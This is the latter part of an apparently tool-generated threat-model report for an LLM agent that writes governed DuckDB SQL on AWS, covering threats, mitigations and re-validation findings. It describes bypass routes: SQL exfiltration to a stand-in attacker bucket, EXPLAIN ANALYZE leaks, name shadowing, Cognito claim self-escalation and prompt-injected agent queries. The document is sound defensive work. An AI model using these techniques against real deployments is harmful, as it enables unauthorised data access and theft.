- **Residual Risk Rationale**: Posture inverted to an AST-shape allowlist: new DuckDB file functions are rejected by default rather than slipping past a stale name list. Additions to the generator exception list require explicit justification. Cloud-verified rejection.
- **Assessment State**: Current

#### T5: Restricted end user presenting an unknown role

**Statement**: A Restricted end user presenting an unknown role Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies can Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical, which leads to Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed

- **Prerequisites**: Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies
- **Action**: Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical
- **Impact**: Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed
- **Impacted Assets**: A001, A004
- **Tags**: role-fallback, order-dependence, phase-7.5-fix
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Fallback is content-derived and declaration-order independent; tested with the two-policy tenant shape that exposed the original bug. Residual: an operator could still author a 'most restricted' policy that is broader than intended - covered by T011.
- **Assessment State**: Current

#### T6: External attacker at the runtime endpoint

**Statement**: A External attacker at the runtime endpoint Network reach to the public AgentCore runtime endpoint; no valid Cognito token can Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client, which leads to Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn

- **Prerequisites**: Network reach to the public AgentCore runtime endpoint; no valid Cognito token
- **Action**: Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client
- **Impact**: Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn
- **Impacted Assets**: A002
- **Tags**: authn, jwt, cognito
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Platform-enforced pre-code validation (401/403 verified live). Residual: stolen VALID tokens are T008; the platform's authorizer is AWS-managed and out of sample scope.
- **Assessment State**: Current

#### T7: Malicious or compromised calling application (SigV4 path)

**Statement**: A Malicious or compromised calling application (SigV4 path) IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity can Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy, which leads to Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source

- **Prerequisites**: IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity
- **Action**: Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy
- **Impact**: Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source
- **Impacted Assets**: A002
- **Tags**: identity-assertion, trust-assumption
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Medium
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Documented trust assumption on the local/CLI SigV4 path only: the caller is IAM-authenticated infrastructure trusted to assert its users' identity (standard service-to-service identity propagation). The deployed path uses the JWT authorizer, where these fallback sources are unreachable because the authorizer rejects unauthenticated requests pre-code.
- **Assessment State**: Current

#### T8: Attacker with access to the analyst's machine or environment

**Statement**: A Attacker with access to the analyst's machine or environment The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password can Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to, which leads to Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity

- **Prerequisites**: The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password
- **Action**: Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to
- **Impact**: Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity
- **Impacted Assets**: A002, A003
- **Tags**: ui, token-theft, default-credentials
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Medium
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Bearer-token theft is inherent to token auth; lifetime bounds exposure. The app client can no longer write custom:tenant/custom:role, so a stolen session cannot be escalated beyond the victim's own role (M020, T018). Demo credentials remain rotate-before-exposing (operator responsibility) and MFA is deliberately OFF for demo convenience - production guidance: short token TTLs, MFA on the pool, restricted app client. Analyst-host security is out of scope for a sample.
- **Assessment State**: Current

#### T9: Restricted end user

**Statement**: A Restricted end user Valid restricted session; CLS policy denies a column (subject_identity) can Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing, which leads to Partial disclosure of denied-column information without direct selection

- **Prerequisites**: Valid restricted session; CLS policy denies a column (subject_identity)
- **Action**: Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing
- **Impact**: Partial disclosure of denied-column information without direct selection
- **Impacted Assets**: A001
- **Tags**: side-channel, inference
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Low
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Inference/side channels against RLS/CLS are an industry-wide limitation of query-rewrite governance (shared with BI-tool row-level security and warehouse RLS). One CONCRETE oracle in this class - EXPLAIN ANALYZE reporting true cardinalities of denied rows - was a real defect, not an accepted residual, and is closed by M017. What remains accepted is aggregate-inference and timing, with guidance to use physical separation for high-sensitivity multi-tenant data. Sample dataset is public/synthetic.
- **Assessment State**: Current

#### T10: Restricted end user

**Statement**: A Restricted end user Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming can Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions, which leads to Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs

- **Prerequisites**: Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming
- **Action**: Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions
- **Impact**: Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs
- **Tags**: resource-exhaustion, cost
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Likely
- **Residual Risk Rationale**: Blast radius is structurally one microVM; envelope caps memory with spill. Cost exposure is the customer's own account and bounded by their throttles/budgets. Remaining: per-request cost, standard for any LLM app.
- **Assessment State**: Current

#### T11: Operator error (customer deployer)

**Statement**: A Operator error (customer deployer) Operator writes GOVERNANCE_POLICIES JSON by hand can Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended, which leads to Unintended data exposure to restricted principals; worst case default role is unrestricted

- **Prerequisites**: Operator writes GOVERNANCE_POLICIES JSON by hand
- **Action**: Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended
- **Impact**: Unintended data exposure to restricted principals; worst case default role is unrestricted
- **Impacted Assets**: A004
- **Tags**: misconfiguration, policy
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Low
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Policy authoring remains the operator's responsibility, but the two fail-open defaults are gone: the default role is the deny-all floor rather than ops:admin (M019), and the policy table is validated at load - key shape, known fields, bare identifiers, one-predicate row_filter, no allow_raw_paths-with-governed-tables (M021). LABELS_PREFIX, which decides what a sanctions screen compares against, is validated and bucket-restricted (M022). Residual: a semantically wrong but well-formed policy (e.g. an over-broad row_filter) still governs as written; the governed trace (M011) gives the audit signal.
- **Assessment State**: Current

#### T12: Restricted end user

**Statement**: A Restricted end user Valid restricted session; DESCRIBE-based schema probe active for CLS intersection can Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink, which leads to Denied columns leak through a stale or failed schema probe

- **Prerequisites**: Valid restricted session; DESCRIBE-based schema probe active for CLS intersection
- **Action**: Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink
- **Impact**: Denied columns leak through a stale or failed schema probe
- **Impacted Assets**: A001
- **Tags**: schema-probe, cache
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Probe failure keeps the full denylist (fail-closed); cache is per-session/per-principal by construction. Residual only if the customer redeploys the module multi-principal - covered by T015.
- **Assessment State**: Current

#### T13: Any principal via agent-generated SQL

**Statement**: A Any principal via agent-generated SQL Gate must block writes for the model to hold can Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time, which leads to Data exfiltration to external targets or persistence beyond the session

- **Prerequisites**: Gate must block writes for the model to hold
- **Action**: Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time
- **Impact**: Data exfiltration to external targets or persistence beyond the session
- **Impacted Assets**: A001
- **Tags**: exfiltration, write-gate
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Three independent layers: statement gate allowlist, READ_ONLY attaches, IAM role without write permissions. COPY TO and ATTACH explicitly rejected with tests.
- **Assessment State**: Current

#### T14: Concurrent tool calls within one session (Strands thread execution)

**Statement**: A Concurrent tool calls within one session (Strands thread execution) LLM issues multiple run_sql calls in one message; shared DuckDB connection can Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution, which leads to Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage

- **Prerequisites**: LLM issues multiple run_sql calls in one message; shared DuckDB connection
- **Action**: Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution
- **Impact**: Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage
- **Tags**: concurrency, race
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: _conn_lock serializes execute+fetch atomically incl. the schema probe; the async-generator tool preserves lock semantics via asyncio.to_thread; regression test exists. Single-principal-per-session makes the worst case an integrity glitch, not cross-principal leakage.
- **Assessment State**: Current

#### T15: Sample consumer (customer engineer)

**Statement**: A Sample consumer (customer engineer) Customer lifts governance.py into a production multi-principal service can Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model, which leads to Cross-principal policy application: user A's query rewritten under user B's policy

- **Prerequisites**: Customer lifts governance.py into a production multi-principal service
- **Action**: Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model
- **Impact**: Cross-principal policy application: user A's query rewritten under user B's policy
- **Impacted Assets**: A001
- **Tags**: misuse-of-sample, documentation
- **Residual Risk Decision**: Accepted
- **Residual Severity**: High
- **Residual Likelihood**: Possible
- **Residual Risk Rationale**: Misuse-of-sample risk: the module-level active-role slot is only safe under one-session-one-principal (AgentCore microVM). Cannot be closed by code in a sample - the misuse happens in the consumer's fork. Controlled by prominent documentation (module docstring + README + this model). Accepted with the HIGH residual kept visible on purpose.
- **Assessment State**: Current

#### T16: Restricted end user observing the streaming trace

**Statement**: A Restricted end user observing the streaming trace Valid restricted session; the SSE trace emits gate/govern/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[]) can Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges, which leads to Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure

- **Prerequisites**: Valid restricted session; the SSE trace emits gate/govern/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[])
- **Action**: Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges
- **Impact**: Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure
- **Impacted Assets**: A004
- **Tags**: trace, sse, policy-disclosure, new-in-v2
- **Residual Risk Decision**: Accepted
- **Residual Severity**: Low
- **Residual Likelihood**: Likely
- **Residual Risk Rationale**: Deliberate transparency tradeoff: the trace shows the principal only their OWN policy application - the same information the clean rejection message conveys - never another tenant's policy or data. Deployments preferring opacity have a single filter point (_map_event). Demo legibility is the sample's purpose.
- **Assessment State**: Current

#### T17: Restricted end user via LLM prompt injection

**Statement**: A Restricted end user via LLM prompt injection Valid restricted session; the governance rewrite is driven by a sqlglot parse and the read-only gate accepts EXPLAIN as a read keyword can Submits a statement shape sqlglot cannot model (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>), which parses to an opaque Command node carrying no table references, so the rewrite loop finds nothing to guard and returns the statement untouched, which leads to Ungoverned execution of the inner query: EXPLAIN ANALYZE really runs it and reports true cardinalities of policy-denied rows in the query plan - a side-channel oracle over denied data, and a passthrough for any shape that returns rows

- **Prerequisites**: Valid restricted session; the governance rewrite is driven by a sqlglot parse and the read-only gate accepts EXPLAIN as a read keyword
- **Action**: Submits a statement shape sqlglot cannot model (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>), which parses to an opaque Command node carrying no table references, so the rewrite loop finds nothing to guard and returns the statement untouched
- **Impact**: Ungoverned execution of the inner query: EXPLAIN ANALYZE really runs it and reports true cardinalities of policy-denied rows in the query plan - a side-channel oracle over denied data, and a passthrough for any shape that returns rows
- **Impacted Assets**: A001
- **Tags**: authz-bypass, parser-coverage, fail-open, phase-7.5-round-2
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Statement-shape allowlist on the parsed root (M017) rejects opaque shapes for restricted principals; regression tests cover EXPLAIN, EXPLAIN ANALYZE and SHOW <table>, and cloud acceptance confirms no plan is emitted. Residual: a NEW syntax that sqlglot models as a governable root but DuckDB interprets differently - bounded by the read-only gate and the same fail-closed parse as T002.
- **Assessment State**: Current

#### T18: Restricted end user (authenticated, low privilege) at the identity source

**Statement**: A Restricted end user (authenticated, low privilege) at the identity source Valid Cognito login; the app client carries no explicit attribute permissions, so it may write every attribute including custom ones; the agent's authorization is entirely claim-driven can Calls UpdateUserAttributes with their own access token to set custom:role=admin (and custom:tenant=ops), then re-authenticates to obtain an ID token carrying the escalated claims, which leads to Total privilege escalation: the authorization layer honours the rewritten claims, so a junior analyst becomes the unrestricted ops:admin principal - every row, every column, raw path access, across all four access methods

- **Prerequisites**: Valid Cognito login; the app client carries no explicit attribute permissions, so it may write every attribute including custom ones; the agent's authorization is entirely claim-driven
- **Action**: Calls UpdateUserAttributes with their own access token to set custom:role=admin (and custom:tenant=ops), then re-authenticates to obtain an ID token carrying the escalated claims
- **Impact**: Total privilege escalation: the authorization layer honours the rewritten claims, so a junior analyst becomes the unrestricted ops:admin principal - every row, every column, raw path access, across all four access methods
- **Impacted Assets**: A001, A002, A003
- **Tags**: privilege-escalation, identity-source, cognito, phase-7.5-round-2
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: App client attribute permissions make custom:tenant/custom:role read-only (M020); verified live against the deployed pool - UpdateUserAttributes returns NotAuthorizedException and claims are unchanged after re-login. Residual: an operator with Cognito admin rights can still misassign roles (same class as IAM role assignment, A007), and MFA is deliberately OFF in this demo, so a stolen password is a stolen identity (T008).
- **Assessment State**: Current

## Mitigations

### Resolved Mitigations

#### M1: Governance rewrite operates on the parsed AST, not string matching: every reference to a governed logical table - via raw view, s3t.*, glue.* or dl.* alias - is replaced by a guarded subquery (RLS predicate + schema-aware CLS EXCLUDE); alias semantics preserved in joins. Local names may NOT shadow a governed table (M018) - the earlier 'skip CTE/CTAS-local names' exemption was itself the bypass - so every table node carrying a governed name is guarded. Governable statement shapes are allowlisted (M017). Explicit selection of a denied column is rejected pre-engine with a legible policy error naming the column and role (never an opaque binder error).

**Addresses Threats**: T1, T2, T9, T17

#### M2: Fail-closed on parse failure: SQL that sqlglot cannot parse is REJECTED for restricted principals (ValueError), never passed through. Unrestricted principals (allow_raw_paths + no governed tables) bypass rewrite by explicit policy only.

**Addresses Threats**: T1, T2

#### M3: Single-statement rule: the gate requires EXACTLY ONE statement per run_sql call, split with duckdb.extract_statements - the engine's own parser, so there is no lexer divergence to aim at; semicolons inside literals/comments/dollar-quotes handled for free. Closes the multi-statement smuggling fail-open (a write riding behind a read).

**Addresses Threats**: T3, T13

#### M4: Read-only statement gate: leading-comment stripping then keyword allowlist (read statements + CREATE TEMP TABLE/VIEW); rejects INSERT/UPDATE/DELETE/non-temp CREATE/ATTACH/COPY TO. DuckDB catalog legs attach READ_ONLY; engine is in-memory and dies with the session; execution role has no write permissions on data buckets - three independent layers against persistence/exfiltration.

**Addresses Threats**: T3, T4, T13

#### M5: Raw file access governed by an ALLOWLIST on AST shape, not a function-name denylist: every FROM/JOIN source must be an exp.Identifier (a real table/view/CTE/temp reference); table-valued functions are rejected with the offending name, with a minimal justified exception list for pure generators (GenerateSeries). Closes the parquet_scan/read_csv_auto/read_json bypass and is future-proof against new DuckDB file functions.

**Addresses Threats**: T1, T4

#### M6: Unknown-role fallback fails CLOSED: an unknown role inside a known tenant resolves to that tenant's MOST restricted policy, ranked by policy content (raw-path denial > governed-table count > row filters > denied columns) over sorted keys - never by declaration order. Unknown tenants get the configured default role.

**Addresses Threats**: T5

#### M7: Inbound AuthN enforced by the platform before agent code: Amazon Cognito user pool issues ID tokens (custom:tenant/custom:role); the AgentCore managed customJWTAuthorizer validates signature (discovery URL) and allowedAudience; requestHeaderAllowlist forwards only Authorization. Verified live: no-token=401, forged-token=403, both pre-code. The sample's jwt.decode(verify_signature=False) is claims EXTRACTION from an already-verified token.

**Addresses Threats**: T6, T7

#### M8: Session blast-radius isolation: one session = one microVM = one DuckDB; a pathological query OOMs only its own session. Resource envelope (DUCKDB_MEMORY_LIMIT + spill directory) turns memory exhaustion into slower-not-dead. Bedrock/S3 cost exposure bounded by the customer's own account throttles.

**Addresses Threats**: T10

#### M9: run_sql serialization under _conn_lock: execute+fetch pairs are atomic on the shared connection; the governance schema probe takes the same lock. Regression test covers parallel tool calls not stealing each other's results.

**Addresses Threats**: T14

#### M10: Schema-aware CLS fails closed: EXCLUDE lists are intersected with a DESCRIBE-probed schema per reference; if the probe FAILS the full denylist is kept (worst case the engine rejects the query). The probe cache lives in one session = one principal = one microVM, so cross-principal poisoning is structurally impossible in the intended deployment.

**Addresses Threats**: T12

#### M11: Observability of governance decisions: every run_sql result carries a governed flag and engine metrics; the SSE trace labels each decision (which row filter, which hidden column, or the policy rejection); runtime logs to CloudWatch. Gives operators an audit signal for whether and how the rewrite applied.

**Addresses Threats**: T1, T11, T16

#### M12: DOCUMENTATION: deployment warnings that (a) without the inbound JWT authorizer, JWT claims are NOT verified and SigV4 identity-assertion paths trust the caller completely - production deployments must treat calling-application identity assertion as a privileged operation; (b) the module-level active-role slot is valid ONLY under one-session-one-principal (AgentCore microVM) and must not be lifted into multi-principal services; (c) demo Cognito users ship with a documented password - rotate credentials and restrict the user pool before exposing a deployment.

**Addresses Threats**: T7, T8, T15

#### M15: Trace transparency is deliberate and bounded: the SSE trace exposes the principal's OWN policy application (their row filter, their denied columns) - the exact information the clean rejection message already conveys - and never another tenant's policy or data. For deployments preferring opacity, the entrypoint envelope mapping is a single filter point to drop rls[]/cls[] details from the stream.

**Addresses Threats**: T16

#### M16: UI credential hygiene: the app client secret enters the UI only via environment variable (never the repo; detect-secrets gate in CI); tokens live in Streamlit session state in-process; persona switching is logout/login so identity is always a validated JWT claim, not a UI toggle.

**Addresses Threats**: T8

#### M17: Statement shapes are an ALLOWLIST on the parsed root (Select, SetOperation, Subquery, Create, Describe, Summarize, Show). sqlglot renders anything it cannot model - EXPLAIN, EXPLAIN ANALYZE, SHOW <table>, future syntax - as an opaque Command node with NO table references, which the rewrite loop silently passed through; EXPLAIN ANALYZE then executed the ungoverned inner query and reported denied-row cardinalities in the plan. Everything outside the allowlist is now rejected for restricted principals. DESCRIBE/SUMMARIZE of a governed table emit the guard as DESCRIBE SELECT * FROM (guard); a PIVOT modifier is moved onto the guard so it aggregates governed rows.

**Addresses Threats**: T1, T2, T9, T17

#### M18: Local names may not shadow governed tables: a CTE, CTAS/temp table, temp view, derived-table alias or table alias that reuses a governed table's name is REJECTED, replacing the previous 'skip table nodes bearing a local name' exemption which unguarded the real base table (RLS and CLS both bypassed, cross-tenant PII proven readable). Refusing the collision - rather than scoping the exemption across recursive CTEs, nested scopes and DuckDB's temp-schema search order - makes the invariant total: with no collision possible, a governed name always denotes the governed table and every reference is guarded.

**Addresses Threats**: T1

#### M19: Deny-all floor as the default role: the built-in 'deny-all' policy is always present in the policy table, is the default when GOVERNANCE_DEFAULT_ROLE is unset, and is where blank / missing / unknown-tenant claims resolve. It rejects every statement before parsing, and the AgentCore entrypoint refuses the invocation up front (one 'access denied' envelope, model never invoked, no Bedrock spend). Local CLI runs must name the principal explicitly (--as <tenant>:<role>), so 'no identity' can never mean 'the admin identity'.

**Addresses Threats**: T11, T5

#### M20: Identity source cannot self-assign governance claims: the Cognito app client declares explicit attribute permissions with custom:tenant / custom:role in READ attributes only (the ID token must still carry them) and never in WRITE attributes, so UpdateUserAttributes with a user's own token is refused (NotAuthorizedException). Role assignment is an operator action via AdminUpdateUserAttributes. Enforced in infra/stack.py via ClientAttributes and applied to the deployed client. MFA on the pool is deliberately left OFF for demo convenience - production guidance keeps it (T008).

**Addresses Threats**: T8, T18

#### M21: Policy JSON validated at load (supersedes M013's 'recommended hardening'): keys must be <tenant>:<role>, fields must be known, table and denied-column names must be bare identifiers, each row_filter must parse as exactly ONE WHERE predicate, allow_raw_paths may not be combined with governed tables (a raw path read bypasses table rules), and the deny-all floor cannot be redefined as permissive. Malformed configuration fail-stops at import instead of silently governing nothing.

**Addresses Threats**: T11

#### M22: LABELS_PREFIX validated before it reaches SQL: strict s3://<bucket>/<key> syntax over [A-Za-z0-9._-] only (no quotes, whitespace, parentheses or other schemes - nothing that can leave the read_parquet literal), no '.'/'..' segments, and the bucket must be the solution-owned bucket or one named in LABELS_ALLOWED_BUCKETS. Since these tables decide the OUTCOME of a sanctions screen, a bad value fail-stops the process rather than screening against attacker-chosen data.

**Addresses Threats**: T11

#### M13: Policy-as-configuration with a fail-safe default: GOVERNANCE_POLICIES is JSON env config and the default is the built-in deny-all floor, not an unrestricted role (see M019). Startup validation of the policy table is IMPLEMENTED, not merely recommended - see M021. Unknown roles inside a known tenant still resolve to that tenant's most restricted policy (M006), with deny_all ranking above every other policy in the restrictiveness ordering.

**Addresses Threats**: T5, T11

### Will Not Action Mitigations

#### M14: Residual acceptance for inference/side channels: aggregate-inference and timing side channels against denied columns are NOT fully closed by any query-rewrite RLS/CLS implementation (industry-wide limitation, same class as BI-tool row-level security). Sample carries a not-for-production disclaimer; production guidance is physical separation (per-tenant tables/views) when denied data is high-sensitivity.

**Addresses Threats**: T9

## Assumptions

### A006: Platform trust

**Description**: AWS-managed services (AgentCore Runtime + JWT authorizer, Cognito, Bedrock, S3, Secrets Manager, CloudWatch) operate correctly per the shared-responsibility model.

- **Impact**: The sample's controls begin where verified requests enter agent code; platform-side AuthN, microVM isolation, and storage encryption are relied upon, not re-verified.
- **Rationale**: Standard AWS shared-responsibility boundary; the managed authorizer's 401/403 pre-code behaviour was verified live but its internals are AWS-operated.

### A007: Operational responsibility

**Description**: The operator/deployer owns the account, the data, the governance policy content, and the Cognito user lifecycle (including rotating the documented demo passwords before any shared exposure).

- **Impact**: Policy-authoring errors and unrotated demo credentials are operator risks (T008/T011), accepted rather than closed by code.
- **Rationale**: A sample cannot enforce operational hygiene in the consumer's account; documentation is the available control.

### A008: Data sensitivity

**Description**: Sample data is public (aws-public-blockchain, public OFAC list) or synthetic (cex_deposit_labels incl. the subject_identity column); no real customer or personal data ships with the sample.

- **Impact**: Worst-case disclosure with shipped data is reputational, not privacy-impacting. Customers substituting confidential data inherit the documented residual risks, notably side-channel inference (T009).
- **Rationale**: Verified: OFAC list is a cited public dataset; CEX labels are authored in the loader with synthetic identifiers; the not-for-production disclaimer covers substitution.

### A009: Execution model

**Description**: One session = one microVM = one principal (the AgentCore execution model).

- **Impact**: Load-bearing for the module-level active-role design and the per-session schema-probe cache; lifting governance.py into a multi-principal service voids these conclusions (T015, HIGH residual, documented).
- **Rationale**: AgentCore Runtime provisions an isolated microVM per session; validated during cloud acceptance (fresh sessions per invoke).

### A010: Deployment configuration

**Description**: The SigV4 payload/header identity-assertion path exists for local/CLI development only; the deployed reference configuration uses the Cognito JWT authorizer.

- **Impact**: T007's caller-asserted identity is unreachable on the deployed path (the authorizer rejects unauthenticated requests before agent code); it remains a documented trust assumption for local use.
- **Rationale**: The shipped .bedrock_agentcore.yaml carries the customJWTAuthorizer; no-token/forged-token rejection verified live 2026-09-02.

## Code Validation Round 2 (2026-09-03) - evidence-based re-validation

The first code-validation pass fixed three fail-opens in controls that existed. This
round asked a different question - is the control COMPLETE? - by reading the
merged code, inspecting the deployed AWS resources, and running executable
proofs. Three findings were in code this model had already marked resolved:

| Finding | Model said | Code did | Now |
|---|---|---|---|
| Local name shadowing a governed table (T1's own "CTE/alias tricks") | M1: "CTE/CTAS-local names skipped" - stated as a feature | Skipping unguarded the REAL base table: a junior read all three exchanges' subject_identity; the temp-table form persisted the stolen rows in-session | M018 refuses the collision; nine adversarial regressions |
| Opaque statement shapes (new T17) | No threat covered it | sqlglot parsed EXPLAIN into a Command with no table nodes, so the rewrite passed it through; EXPLAIN ANALYZE executed ungoverned and leaked denied-row cardinality | M017 allowlists the parsed root |
| Default role (T11) | "unknown principals fail closed" | GOVERNANCE_DEFAULT_ROLE defaulted to ops:admin, so blank/unknown claims became the unrestricted principal | M019 deny-all floor + pre-model refusal |
| Self-service claim rewrite (new T18) | T8 accepted "restrict the app client" as production guidance | The DEPLOYED client had no attribute permissions: UpdateUserAttributes(custom:role=admin) succeeded and the next ID token carried ops:admin | M020 claims read-only on the client |
| Policy / label-prefix validation (T11) | M013 "in progress", documentation only | No validation code; LABELS_PREFIX went unchecked into read_parquet() | M021 + M022, both fail-stop at import |

**Method note.** Every finding here was reproduced end to end before being
accepted, and every fix re-verified the same way: 145 offline regressions (49 of them new and
adversarial) plus cloud acceptance on runtime v15 through the real Cognito JWT
path - per-persona results unchanged, both proof-of-concept queries rejected
pre-engine, unknown-tenant claims answered with principal=deny-all and no
model invocation. Design rationale: docs/design.md.

**Lesson for this model.** Two of the three missed defects were places where a
mitigation's TEXT described the intent and the code implemented something
narrower; the third was a default value no threat statement mentioned. Both
patterns are invisible to a design-level review, which is what code
validation exists to catch - so mitigation text is now written against the code path, and
completeness rules are recorded as invariants (docs/design.md, design invariants).

## Phase Progress

| Phase | Name | Completion |
|---|---|---|
| 1 | Business Context Analysis | 100% ✅ |
| 2 | Architecture Analysis | 100% ✅ |
| 3 | Threat Actor Analysis | 100% ✅ |
| 4 | Trust Boundary Analysis | 100% ✅ |
| 5 | Asset Flow Analysis | 100% ✅ |
| 6 | Threat Identification | 100% ✅ |
| 7 | Mitigation Planning | 100% ✅ |
| 7.5 | Code Validation Analysis | 100% ✅ |
| 8 | Residual Risk Analysis | 100% ✅ |
| 9 | Output Generation and Documentation | 100% ✅ |

---

*This threat model report was generated automatically by the Threat Modeling MCP Server.*
